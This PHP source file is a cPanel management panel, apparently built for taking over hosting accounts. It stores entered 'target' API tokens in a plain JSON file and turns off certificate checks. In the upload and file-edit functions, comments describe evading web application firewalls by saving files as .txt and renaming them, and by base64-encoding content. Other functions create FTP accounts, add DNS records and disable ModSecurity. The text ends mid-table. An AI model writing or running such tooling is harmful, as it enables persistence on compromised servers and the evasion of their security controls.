<?php
session_start();
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

// Verifikasi Sesi Sentral
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    header('Location: index.php');
    exit;
}

define('CREDENTIALS_FILE', 'xnxs.json');

// --- Helper Functions for Credentials ---
function get_saved_credentials() {
    if (!file_exists(CREDENTIALS_FILE)) {
        return [];
    }
    $json = file_get_contents(CREDENTIALS_FILE);
    $data = json_decode($json, true);
    return is_array($data) ? $data : [];
}

function save_credentials(array $credentials) {
    file_put_contents(CREDENTIALS_FILE, json_encode($credentials, JSON_PRETTY_PRINT));
}

// --- CPanelBrowser Class ---
class CPanelBrowser {
    private $baseUrl;
    private $auth;
    private $username;
    public $currentDir;
    
    public function __construct($domain, $username, $apiToken, $currentDir = '') {
        $this->baseUrl = "https://{$domain}:2083";
        $this->auth = "cpanel {$username}:{$apiToken}";
        $this->username = $username;
        $this->currentDir = $currentDir;
    }

    private function api_request($url, $postFields = null) {
        $ch = curl_init();
        $options = [
            CURLOPT_URL => $this->baseUrl . $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => ['Authorization: ' . $this->auth],
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => 20,
        ];
        if ($postFields !== null) {
            $options[CURLOPT_POST] = true;
            $options[CURLOPT_POSTFIELDS] = $postFields;
        }
        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if ($response === false) {
            return ['error' => 'cURL error: ' . curl_error($ch)];
        }
        curl_close($ch);
        
        $decoded = json_decode($response, true);
        if ($decoded === null) {
            return ['error' => "HTTP $httpCode - Request blocked by Firewall/WAF."];
        }
        return $decoded;
    }

    public function testConnection() {
        $result = $this->api_request('/execute/Email/list_pops');
        return isset($result['status']);
    }

    public function listDir() {
        return $this->api_request('/execute/Fileman/list_files?dir=' . urlencode($this->currentDir) . '&show_hidden=1');
    }

    // Fallback didesain untuk lolos dari WAF via metode upload lokal
    public function uploadLocalFile($filePath, $fileName, $mimeType = 'application/octet-stream') {
        $postFields = [ 'dir' => $this->currentDir, 'file' => new CURLFile($filePath, $mimeType, $fileName) ];
        $res = $this->api_request('/execute/Fileman/upload_files', $postFields);
        
        // Fallback: Jika terblokir, upload sebagai .txt lalu rename
        if (isset($res['error']) || (isset($res['status']) && $res['status'] == 0)) {
            $tempName = md5(uniqid()) . '.txt';
            $postFields = [ 'dir' => $this->currentDir, 'file' => new CURLFile($filePath, $mimeType, $tempName) ];
            $resFallback = $this->api_request('/execute/Fileman/upload_files', $postFields);
            
            if (!isset($resFallback['error']) && (!isset($resFallback['status']) || $resFallback['status'] != 0)) {
                $this->renameItem($tempName, $fileName);
                return $resFallback;
            }
        }
        return $res;
    }

    public function viewFile($filename) {
        $result = $this->api_request('/execute/Fileman/get_file_content?dir=' . urlencode($this->currentDir) . '&file=' . urlencode($filename));
        return $result['data']['content'] ?? 'Unable to read file content';
    }

    // Fallback ketika modifikasi source code (WAF Bypass)
    public function createFileWithFallback($filename, $content) {
        $postFields = http_build_query(['dir' => $this->currentDir, 'file' => $filename, 'content' => $content]);
        $res = $this->api_request('/execute/Fileman/save_file_content', $postFields);
        
        // Fallback: Trik menyimpan ke TXT dahulu kemudian rename ke ekstensi target
        if (isset($res['error']) || (isset($res['status']) && $res['status'] == 0)) {
            $tempName = md5(uniqid()) . '.txt';
            $postFieldsFallback = http_build_query(['dir' => $this->currentDir, 'file' => $tempName, 'content' => $content]);
            $resFallback = $this->api_request('/execute/Fileman/save_file_content', $postFieldsFallback);
            
            if (!isset($resFallback['error']) && (!isset($resFallback['status']) || $resFallback['status'] != 0)) {
                $this->renameItem($tempName, $filename);
                return $resFallback;
            }
        }
        return $res;
    }

    public function createFolder($foldername) {
        $postFields = http_build_query(['cpanel_jsonapi_module' => 'Fileman', 'cpanel_jsonapi_func' => 'mkdir', 'path' => $this->currentDir, 'name' => $foldername]);
        return $this->api_request('/json-api/cpanel', $postFields);
    }

    public function renameItem($oldName, $newName) {
        $postFields = http_build_query(['cpanel_jsonapi_module' => 'Fileman', 'cpanel_jsonapi_func' => 'fileop', 'op' => 'rename', 'sourcefiles' => $this->currentDir . '/' . $oldName, 'destfiles' => $this->currentDir . '/' . $newName]);
        return $this->api_request('/json-api/cpanel', $postFields);
    }
    
    private function deleteItem($itemname) {
         $postFields = http_build_query(['cpanel_jsonapi_module' => 'Fileman', 'cpanel_jsonapi_func' => 'fileop', 'op' => 'trash', 'sourcefiles' => $this->currentDir . '/' . $itemname]);
        return $this->api_request('/json-api/cpanel', $postFields);
    }
    public function deleteFile($filename) { return $this->deleteItem($filename); }
    public function deleteFolder($foldername) { return $this->deleteItem($foldername); }

    public function listFTPAccounts() {
        return $this->api_request('/execute/Ftp/list_ftp?skip_acct_types=main|logaccess');
    }

    public function createFTPAccount($username, $password, $quota = 0) {
        $postFields = http_build_query(['user' => $username, 'pass' => $password, 'quota' => $quota, 'homedir' => '' . $username]);
        return $this->api_request('/execute/Ftp/add_ftp', $postFields);
    }

    public function deleteFTPAccount($user) {
        return $this->api_request('/execute/Ftp/delete_ftp', http_build_query(['user' => $user]));
    }

    public function listDNSRecords($zone) {
        $result = $this->api_request('/execute/DNS/parse_zone?zone=' . urlencode($zone));
        return ['records' => $result];
    }

    public function addDNSRecord($domain, $name, $type, $address, $ttl = 14400) {
        if ($name === "@" || empty($name)) $name = $domain . '.';
        elseif (strpos($name, '.') === false) $name = $name . '.' . $domain . '.';
        return $this->api_request('/execute/ZoneEdit/add_zone_record', http_build_query(compact('domain', 'name', 'type', 'address', 'ttl')));
    }

    public function listModSecurityDomains() {
        return $this->api_request('/execute/ModSecurity/list_domains');
    }

    public function toggleModSecurity($domain, $enable = true) {
        $action = $enable ? 'enable_domains' : 'disable_domains';
        return $this->api_request("/execute/ModSecurity/{$action}", http_build_query(['domains' => $domain]));
    }
}

// --- Header Templates & Base Styles ---
$htmlHeader = <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CENTRAL COMMAND // CPANEL MANAGER</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<script>
  tailwind.config = {
    theme: {
      extend: {
        colors: { paper: '#ecece4', ink: '#111111', stampRed: '#c1121f', stampGreen: '#1a5e20' },
        fontFamily: { mono: ['"Courier Prime"', 'monospace'], serif: ['"Playfair Display"', 'serif'] }
      }
    }
  }
</script>
<style>
    :root { --bg-paper: #ecece4; --text-ink: #111; --stamp-red: #c1121f; --stamp-green: #1a5e20; }
    body { background-color: var(--bg-paper); color: var(--text-ink); font-family: 'Courier Prime', monospace; overflow-x: hidden; }
    .scanner { position: fixed; top: 0; left: 0; width: 100%; height: 10px; background: rgba(0,0,0,0.1); box-shadow: 0 0 20px rgba(0,0,0,0.2); opacity: 0.4; z-index: 100; pointer-events: none; animation: scan 6s linear infinite; }
    .dossier-bg::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noise"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.8" numOctaves="4" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noise)" opacity="0.06"/%3E%3C/svg%3E'); pointer-events: none; z-index: 1; }
    .classification-bar { position: fixed; left: 0; width: 100%; background-color: var(--text-ink); color: var(--bg-paper); text-align: center; font-weight: bold; letter-spacing: 4px; padding: 6px 0; font-size: 0.85rem; z-index: 50; }
    .classification-bar.top { top: 0; } .classification-bar.bottom { bottom: 0; }
    @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
    
    .paperclip { position: absolute; top: -20px; left: -15px; width: 40px; height: auto; transform: rotate(-10deg); filter: drop-shadow(2px 3px 2px rgba(0,0,0,0.4)); z-index: 10; }
    .dossier-panel { background: transparent; border: 2px solid var(--text-ink); box-shadow: 6px 6px 0px rgba(0,0,0,0.9); position: relative; }
    
    .modal { transition: opacity 0.3s ease, transform 0.3s ease; transform: scale(0.95); opacity: 0; }
    .modal.show { transform: scale(1); opacity: 1; }
    
    input, select, textarea { background-color: transparent !important; border: none !important; border-bottom: 2px dashed var(--text-ink) !important; color: var(--text-ink) !important; outline: none; border-radius: 0 !important; }
    input:focus, select:focus, textarea:focus { border-bottom: 2px solid var(--stamp-red) !important; background: rgba(0,0,0,0.03) !important; }
    
    .btn-primary { background-color: var(--text-ink); color: var(--bg-paper); border: 1px solid var(--text-ink); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; transition: all 0.2s; }
    .btn-primary:hover { background-color: transparent; color: var(--text-ink); }
    .btn-danger { background-color: var(--stamp-red); color: var(--bg-paper); border: 1px solid var(--stamp-red); font-weight: bold; text-transform: uppercase; transition: all 0.2s; }
    .btn-danger:hover { background-color: transparent; color: var(--stamp-red); }
    
    .sidebar-link { border-left: 3px solid transparent; font-weight: bold; transition: all 0.2s; }
    .sidebar-link:hover, .sidebar-link.active { background-color: rgba(0,0,0,0.05); border-left-color: var(--stamp-red); color: var(--stamp-red); padding-left: 1.5rem; }
    
    table th { text-transform: uppercase; font-family: 'Playfair Display', serif; letter-spacing: 1px; }
    tr:hover td { background-color: rgba(0,0,0,0.03); }
    
    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.4); border-radius: 0; }
    ::-webkit-scrollbar-thumb:hover { background: rgba(0,0,0,0.7); }
</style>
</head><body class="bg-paper text-ink font-mono min-h-screen dossier-bg pt-8 pb-8 flex flex-col items-center justify-center">
<div class="scanner"></div>
<div class="classification-bar top">TOP SECRET // NOFORN</div>
HTML;

$htmlFooter = <<<HTML
<div class="classification-bar bottom">TOP SECRET // NOFORN</div></body></html>
HTML;


// --- cPanel Login & Logout Logic ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'login_new') {
        if (empty($_POST['domain']) || empty($_POST['username']) || empty($_POST['apiToken'])) {
            $loginError = 'All fields are required';
        } else {
            try {
                $tempBrowser = new CPanelBrowser($_POST['domain'], $_POST['username'], $_POST['apiToken']);
                if ($tempBrowser->testConnection()) {
                    $home_base = trim($_POST['home_base']);
                    if (empty($home_base)) $home_base = '/home';
                    $home_base = '/' . trim($home_base, '/');
                    $fullHomeDir = $home_base . '/' . $_POST['username'];

                    $all_credentials = get_saved_credentials();
                    $new_credential = ['domain' => $_POST['domain'], 'username' => $_POST['username'], 'apiToken' => $_POST['apiToken'], 'homedir' => $fullHomeDir];
                    $account_id = $_POST['username'] . '@' . $_POST['domain'];
                    $found = false;
                    foreach ($all_credentials as $key => $cred) {
                        if (($cred['username'] . '@' . $cred['domain']) === $account_id) {
                            $all_credentials[$key] = $new_credential;
                            $found = true;
                            break;
                        }
                    }
                    if (!$found) $all_credentials[] = $new_credential;
                    save_credentials($all_credentials);
                    $_SESSION['active_account_id'] = $account_id;
                    header('Location: ' . $_SERVER['PHP_SELF']);
                    exit;
                } else {
                    $loginError = 'Invalid credentials or connection failed.';
                }
            } catch (Exception $e) {
                $loginError = 'Connection error: ' . $e->getMessage();
            }
        }
    } elseif ($_POST['action'] === 'login_existing' && isset($_POST['account_id'])) {
        $_SESSION['active_account_id'] = $_POST['account_id'];
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (isset($_GET['logout'])) {
    unset($_SESSION['active_account_id']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- cPanel Account Selection / Main App Logic ---
$active_credential = null;
if (isset($_SESSION['active_account_id'])) {
    $all_credentials = get_saved_credentials();
    foreach ($all_credentials as $cred) {
        if (($cred['username'] . '@' . $cred['domain']) === $_SESSION['active_account_id']) {
            $active_credential = $cred;
            break;
        }
    }
    if ($active_credential === null) {
        unset($_SESSION['active_account_id']);
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}

if ($active_credential === null) {
    $saved_credentials = get_saved_credentials();
    echo $htmlHeader;
    ?>
    <div class="w-full max-w-lg z-10 p-4">
        <?php if (!empty($saved_credentials) && !isset($_GET['show_new'])): ?>
        <div class="dossier-panel p-8 animate-slide-up">
            <svg class="paperclip" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path></svg>
            <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2">
                <h1 class="text-2xl font-serif font-bold text-ink">SELECT TARGET</h1>
                <a href="?show_new=1" class="text-xs font-bold uppercase tracking-wider hover:text-stampRed transition-all"><i class="fa-solid fa-plus mr-1"></i> Add Entry</a>
            </div>
            <div class="max-h-[60vh] overflow-y-auto">
                <table class="w-full text-left">
                    <thead class="sticky top-0 bg-paper">
                        <tr><th class="p-3 text-sm font-bold text-ink border-b-2 border-ink">Username</th><th class="p-3 text-sm font-bold text-ink border-b-2 border-ink">Domain</th><th class="p-3 text-sm font-bold text-ink border-b-2 border-ink"></th></tr>
                    </thead>
                    <tbody class="divide-y divide-ink/20">
                        <?php foreach ($saved_credentials as $cred): $account_id = $cred['username'] . '@' . $cred['domain']; ?>
                        <tr class="hover:bg-black/5 transition-colors">
                            <td class="p-3 font-bold text-ink"><?= htmlspecialchars($cred['username']) ?></td>
                            <td class="p-3 text-ink/80"><?= htmlspecialchars($cred['domain']) ?></td>
                            <td class="p-3 text-right">
                                <form method="post" class="inline">
                                    <input type="hidden" name="action" value="login_existing">
                                    <input type="hidden" name="account_id" value="<?= htmlspecialchars($account_id) ?>">
                                    <button type="submit" class="text-xs font-bold uppercase border-b-2 border-ink hover:text-stampRed hover:border-stampRed transition-all">CONNECT</button>
                                </form>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        <?php else: ?>
        <div class="dossier-panel p-8 animate-slide-up">
            <svg class="paperclip" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path></svg>
            <h1 class="text-2xl font-serif font-bold mb-6 text-center text-ink border-b-2 border-ink pb-2">ESTABLISH UPLINK</h1>
            <?php if (isset($loginError)): ?>
            <div class="mb-4 p-3 bg-stampRed/10 text-stampRed font-bold border-l-4 border-stampRed text-sm"><?= htmlspecialchars($loginError); ?></div>
            <?php endif; ?>
            <form method="post" class="space-y-6 mt-4">
                <input type="hidden" name="action" value="login_new">
                <div>
                    <label class="block text-ink font-bold mb-1 text-sm tracking-wide">TARGET DOMAIN</label>
                    <input type="text" name="domain" class="w-full p-2" placeholder="e.g., example.com" required>
                </div>
                <div>
                    <label class="block text-ink font-bold mb-1 text-sm tracking-wide">OPERATIVE USERNAME</label>
                    <input type="text" name="username" class="w-full p-2" required>
                </div>
                <div>
                    <label class="block text-ink font-bold mb-1 text-sm tracking-wide">API CIPHER TOKEN</label>
                    <input type="password" name="apiToken" class="w-full p-2" required>
                </div>
                <div>
                    <label class="block text-ink font-bold mb-1 text-sm tracking-wide">HOME BASE PATH (OPTIONAL)</label>
                    <input type="text" name="home_base" class="w-full p-2" placeholder="Default: /home">
                </div>
                <button type="submit" class="w-full btn-primary p-3 mt-4 text-center block">INITIALIZE CONNECTION</button>
                <?php if (!empty($saved_credentials)): ?>
                <div class="text-center mt-4"><a href="<?= $_SERVER['PHP_SELF'] ?>" class="text-ink/60 hover:text-ink text-sm font-bold border-b border-dashed">&larr; ABORT & RETURN</a></div>
                <?php endif; ?>
            </form>
        </div>
        <?php endif; ?>
    </div>
    <?php echo $htmlFooter; exit;
}

// --- If logged in, initialize the application ---
$defaultDir = ($active_credential['homedir'] ?? '/home/' . $active_credential['username']) . '';
$currentDir = $_GET['dir'] ?? $_POST['dir'] ?? $defaultDir;
$browser = new CPanelBrowser($active_credential['domain'], $active_credential['username'], $active_credential['apiToken'], $currentDir);

// --- AJAX HANDLER ---
if (isset($_GET['view'])) {
    try {
        $fileContent = $browser->viewFile($_GET['view']);
        header('Content-Type: text/plain; charset=UTF-8');
        echo $fileContent;
    } catch (Exception $e) {
        header("HTTP/1.1 500 Internal Server Error");
        echo "Error fetching file content: " . $e->getMessage();
    }
    exit;
}

// --- POST Action Handlers ---
$message = '';
$message_type = 'info';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    try {
        switch($_POST['action']) {
            case 'create_file':
            case 'edit_file':
                // BASE64 FALLBACK: Decode base64 dari sisi JS client untuk menghindari blokir WAF lokal saat request POST
                $content = isset($_POST['content_b64']) && !empty($_POST['content_b64']) 
                           ? base64_decode($_POST['content_b64']) 
                           : ($_POST['content'] ?? '');
                
                $browser->createFileWithFallback($_POST['filename'], $content);
                $message = $_POST['action'] === 'create_file' ? 'File created successfully.' : 'File updated securely.';
                break;
            case 'upload_base64':
                // BASE64 FALLBACK: Mengunggah file dari base64 yang dikirim via JS (WAF Evasion)
                $content = base64_decode($_POST['filecontent']);
                $filename = $_POST['filename'];
                $tmpPath = sys_get_temp_dir() . '/' . md5(uniqid());
                file_put_contents($tmpPath, $content);
                
                $browser->uploadLocalFile($tmpPath, $filename);
                unlink($tmpPath);
                $message = 'File uploaded successfully (WAF Bypassed).';
                break;
            case 'create_folder': $browser->createFolder($_POST['foldername']); $message = 'Directory created.'; break;
            case 'delete_file': $browser->deleteFile($_POST['filename']); $message = 'File deleted.'; break;
            case 'delete_folder': $browser->deleteFolder($_POST['foldername']); $message = 'Directory deleted.'; break;
            case 'rename': $browser->renameItem($_POST['old_name'], $_POST['new_name']); $message = 'Item renamed.'; break;
            case 'create_ftp': $browser->createFTPAccount($_POST['login'], $_POST['password'], $_POST['quota'] ?? 0); $message = 'FTP access granted.'; break;
            case 'delete_ftp': $browser->deleteFTPAccount($_POST['user']); $message = 'FTP access revoked.'; break;
            case 'add_dns': $browser->addDNSRecord($active_credential['domain'], $_POST['dname'], $_POST['record_type'], $_POST['address'], (int)$_POST['ttl']); $message = 'DNS record added.'; break;
            case 'toggle_modsec': $browser->toggleModSecurity($_POST['domain'], isset($_POST['enable'])); $message = 'ModSecurity rules applied.'; break;
        }
    } catch (Exception $e) {
        $message = 'CRITICAL ERROR: ' . $e->getMessage();
        $message_type = 'error';
    }
}

// Prepare data for page rendering
$contents = $browser->listDir();
$pathParts = explode('/', trim($currentDir, '/'));
$breadcrumb = [];
$accumulatedPath = '';
foreach ($pathParts as $part) {
    if(empty($part)) continue;
    $accumulatedPath .= '/' . $part;
    $breadcrumb[] = ['name' => $part, 'path' => $accumulatedPath];
}
$section = $_GET['section'] ?? 'files';

// Print Head directly
echo str_replace('justify-center', 'items-stretch', $htmlHeader);
?>
<div id="sidebar-overlay" class=""></div>
<div class="w-full flex-1 flex relative z-10 max-w-7xl mx-auto px-2">

    <div id="sidebar" class="w-64 space-y-6 py-7 px-4 fixed inset-y-0 left-0 transform -translate-x-full transition-transform duration-300 ease-in-out md:relative md:translate-x-0 z-40 bg-paper border-r-2 border-ink shadow-[4px_0_0_rgba(0,0,0,0.1)] pt-12">
        <div class="mb-8 border-b-2 border-ink pb-4">
            <h1 class="text-2xl font-bold text-ink uppercase font-serif tracking-widest">CPANEL CMD</h1>
            <p class="text-xs text-ink mt-2 uppercase font-bold tracking-widest">ID: <span class="text-stampRed"><?= htmlspecialchars($active_credential['username']) ?></span></p>
            <p class="text-xs text-ink/60 uppercase tracking-widest mt-1"><?= htmlspecialchars($active_credential['domain']) ?></p>
        </div>
        <nav class="flex flex-col space-y-3">
            <a href="?section=files" class="sidebar-link py-2 px-2 text-sm uppercase <?= $section === 'files' ? 'active' : '' ?>"><i class="fa-solid fa-folder w-6"></i> File Manager</a>
            <a href="?section=ftp" class="sidebar-link py-2 px-2 text-sm uppercase <?= $section === 'ftp' ? 'active' : '' ?>"><i class="fa-solid fa-server w-6"></i> FTP Accounts</a>
            <a href="?section=dns" class="sidebar-link py-2 px-2 text-sm uppercase <?= $section === 'dns' ? 'active' : '' ?>"><i class="fa-solid fa-globe w-6"></i> DNS Zone</a>
            <a href="?section=modsec" class="sidebar-link py-2 px-2 text-sm uppercase <?= $section === 'modsec' ? 'active' : '' ?>"><i class="fa-solid fa-shield-halved w-6"></i> ModSecurity</a>
            <a href="dashboard.php" class="sidebar-link py-2 px-2 text-sm uppercase mt-8 text-stampGreen border-l-0 border-b-2 border-dashed border-stampGreen hover:bg-stampGreen hover:text-paper hover:border-solid text-center block"><i class="fa-solid fa-house mr-2"></i> MAIN DASHBOARD</a>
        </nav>
        <div class="absolute bottom-10 w-full left-0 px-4">
            <a href="?logout=1" class="w-full block text-center btn-danger px-4 py-2 text-sm"><i class="fa-solid fa-plug-circle-xmark mr-2"></i> DISCONNECT</a>
        </div>
    </div>

    <main class="flex-1 p-4 md:p-6 lg:p-8 pt-10 relative">
        <button id="mobile-menu-button" class="md:hidden mb-4 btn-primary px-3 py-2 text-sm"><i class="fa-solid fa-bars mr-2"></i> MENU</button>
        
        <?php if ($message): $msg_class = $message_type === 'error' ? 'bg-stampRed/10 text-stampRed border-stampRed' : 'bg-stampGreen/10 text-stampGreen border-stampGreen'; ?>
        <div class="mb-6 p-3 border-l-4 font-bold text-sm <?= $msg_class ?> uppercase tracking-wider"><i class="fa-solid fa-circle-exclamation mr-2"></i><?= htmlspecialchars($message) ?></div>
        <?php endif; ?>

        <?php if ($section === 'files'): ?>
        <div class="dossier-panel p-4 md:p-6 bg-paper/80 backdrop-blur-sm">
            <div class="flex flex-wrap justify-between items-center gap-4 mb-6 border-b-2 border-ink pb-4">
                <h2 class="text-2xl font-serif font-bold text-ink">FILE MANAGER</h2>
                <div class="flex flex-wrap gap-2">
                    <input type="file" id="file-upload-base64" class="hidden">
                    <label for="file-upload-base64" class="btn-primary px-4 py-1.5 cursor-pointer flex items-center text-sm"><i class="fa-solid fa-upload mr-2"></i> Upload</label>
                    <button onclick="showFileModal()" class="btn-primary px-4 py-1.5 flex items-center text-sm"><i class="fa-solid fa-file-circle-plus mr-2"></i> New File</button>
                    <button onclick="showFolderModal()" class="btn-primary px-4 py-1.5 flex items-center text-sm"><i class="fa-solid fa-folder-plus mr-2"></i> New Folder</button>
                </div>
            </div>
            <div class="mb-4 bg-black/5 p-3 text-ink text-sm overflow-x-auto whitespace-nowrap font-bold border border-ink/20 border-dashed" id="current_path_container">
                <input type="hidden" id="current_path_input" value="<?= htmlspecialchars($currentDir) ?>">
                > PATH: 
                <?php foreach ($breadcrumb as $index => $part) { echo '<a href="?section=files&dir=' . urlencode($part['path']) . '" class="hover:text-stampRed hover:underline">' . htmlspecialchars($part['name']) . '</a>'; if ($index < count($breadcrumb) - 1) echo ' <span class="mx-1">/</span> '; } ?>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full text-left min-w-[600px] text-sm">
                    <thead><tr class="border-b-2 border-ink text-ink"><th class="p-3">Name</th><th class="p-3">Size</th><th class="p-3">Modified</th><th class="p-3">Actions</th></tr></thead>
                    <tbody>
                        <?php if (!empty($contents['data'])) { foreach ($contents['data'] as $item) { 
                            echo '<tr class="border-b border-ink/20 hover:bg-black/5"><td class="p-3 text-ink font-bold">'; 
                            if ($item['type'] === 'dir') { echo '<i class="fa-solid fa-folder text-ink/70 mr-2"></i> <a href="?section=files&dir=' . urlencode($currentDir . '/' . $item['file']) . '" class="hover:text-stampRed hover:underline">' . htmlspecialchars($item['file']) . '</a>'; } else { echo '<i class="fa-solid fa-file-lines text-ink/50 mr-2"></i> <span onclick="showViewModal(\'' . htmlspecialchars($item['file'], ENT_QUOTES) . '\')" class="cursor-pointer hover:text-stampRed hover:underline">' . htmlspecialchars($item['file']) . '</span>'; } 
                            echo '</td><td class="p-3 text-ink/80">' . ($item['humansize'] ?? '-') . '</td><td class="p-3 text-ink/80">' . (isset($item['mtime']) ? date('Y-m-d H:i', $item['mtime']) : '-') . '</td><td class="p-3"><div class="flex gap-4 font-bold">'; 
                            if ($item['type'] !== 'dir') { echo '<button onclick="showEditModal(\'' . htmlspecialchars($item['file'], ENT_QUOTES) . '\')" class="text-stampGreen hover:underline uppercase text-xs">Edit</button>'; } 
                            echo '<button onclick="showRenameModal(\'' . htmlspecialchars($item['file'], ENT_QUOTES) . '\', \'' . $item['type'] . '\')" class="text-yellow-600 hover:underline uppercase text-xs">Rename</button><form method="post" onsubmit="return confirm(\'Are you sure you want to delete this?\');" class="inline"><input type="hidden" name="action" value="delete_' . ($item['type'] === 'dir' ? 'folder' : 'file') . '"><input type="hidden" name="' . ($item['type'] === 'dir' ? 'foldername' : 'filename') . '" value="' . htmlspecialchars($item['file']) . '"><button type="submit" class="text-stampRed hover:underline uppercase text-xs">Delete</button></form></div></td></tr>'; 
                        } } else { echo '<tr><td colspan="4" class="p-4 text-center text-ink/50 font-bold uppercase italic border-b border-ink/20">Directory is empty.</td></tr>'; } ?>
                    </tbody>
                </table>
            </div>
        </div>

        <?php elseif ($section === 'ftp'): $ftpAccounts = $browser->listFTPAccounts(); ?>
        <div class="dossier-panel p-4 md:p-6 bg-paper/80 backdrop-blur-sm">
            <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-4"><h2 class="text-2xl font-serif font-bold text-ink">FTP ACCOUNTS</h2><button onclick="showFTPModal()" class="btn-primary px-4 py-1.5 flex items-center text-sm"><i class="fa-solid fa-user-plus mr-2"></i> New Account</button></div>
            <div class="overflow-x-auto"><table class="w-full text-left min-w-[600px] text-sm"><thead><tr class="border-b-2 border-ink text-ink"><th class="p-3">User</th><th class="p-3">Home Dir</th><th class="p-3">Quota</th><th class="p-3"></th></tr></thead><tbody>
                <?php if (!empty($ftpAccounts['data'])) { foreach ($ftpAccounts['data'] as $account) { $quota = $account['diskquota'] ?? 'unlimited'; $quota_text = ($quota === 'unlimited' || $quota == 0) ? 'Unlimited' : $quota . ' MB'; echo '<tr class="border-b border-ink/20 hover:bg-black/5"><td class="p-3 text-ink font-bold">' . htmlspecialchars($account['user']) . '</td><td class="p-3 text-ink/80">' . htmlspecialchars($account['homedir']) . '</td><td class="p-3 text-ink/80">' . $quota_text . '</td><td class="p-3 text-right"><form method="post" onsubmit="return confirm(\'Delete FTP Account?\')"><input type="hidden" name="action" value="delete_ftp"><input type="hidden" name="user" value="' . htmlspecialchars($account['user']) . '"><button type="submit" class="text-stampRed hover:underline uppercase text-xs font-bold">Delete</button></form></td></tr>'; } } else { echo '<tr><td colspan="4" class="p-4 text-center uppercase font-bold text-ink/50">No FTP accounts found.</td></tr>'; } ?>
            </tbody></table></div>
        </div>

        <?php elseif ($section === 'dns'): $dnsData = $browser->listDNSRecords($active_credential['domain']); $dnsRecords = $dnsData['records']; ?>
        <div class="dossier-panel p-4 md:p-6 bg-paper/80 backdrop-blur-sm">
            <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-4"><h2 class="text-2xl font-serif font-bold text-ink">DNS ZONE</h2><button onclick="showAddDNSModal()" class="btn-primary px-4 py-1.5 flex items-center text-sm"><i class="fa-solid fa-plus mr-2"></i> Add Record</button></div>
            <div class="overflow-x-auto"><table class="w-full text-left text-sm"><thead><tr class="border-b-2 border-ink text-ink"><th class="p-3">Name</th><th class="p-3">Type</th><th class="p-3">TTL</th><th class="p-3">Value</th></tr></thead><tbody>
                <?php if(!empty($dnsRecords['data'])) { foreach($dnsRecords['data'] as $rec) { $name = htmlspecialchars(base64_decode($rec['dname_b64'] ?? '')); $type = htmlspecialchars($rec['record_type'] ?? 'N/A'); $ttl = htmlspecialchars($rec['ttl'] ?? 'N/A'); $data_b64 = $rec['data_b64'] ?? []; $value = htmlspecialchars(implode(' ', array_map('base64_decode', $data_b64))); echo '<tr class="border-b border-ink/20 hover:bg-black/5"><td class="p-3 font-bold break-all">'.$name.'</td><td class="p-3">'.$type.'</td><td class="p-3">'.$ttl.'</td><td class="p-3 break-all text-ink/80 font-mono">'.$value.'</td></tr>'; }} else { echo '<tr><td colspan="4" class="p-4 text-center font-bold text-ink/50 uppercase">No DNS records found.</td></tr>'; } ?>
            </tbody></table></div>
        </div>

        <?php elseif ($section === 'modsec'): $modsecDomains = $browser->listModSecurityDomains(); ?>
        <div class="dossier-panel p-4 md:p-6 bg-paper/80 backdrop-blur-sm">
            <h2 class="text-2xl font-serif font-bold text-ink mb-6 border-b-2 border-ink pb-4">MODSECURITY</h2>
            <div class="overflow-x-auto"><table class="w-full text-left text-sm"><thead><tr class="border-b-2 border-ink text-ink"><th class="p-3">Domain</th><th class="p-3">Status</th><th class="p-3">Actions</th></tr></thead><tbody>
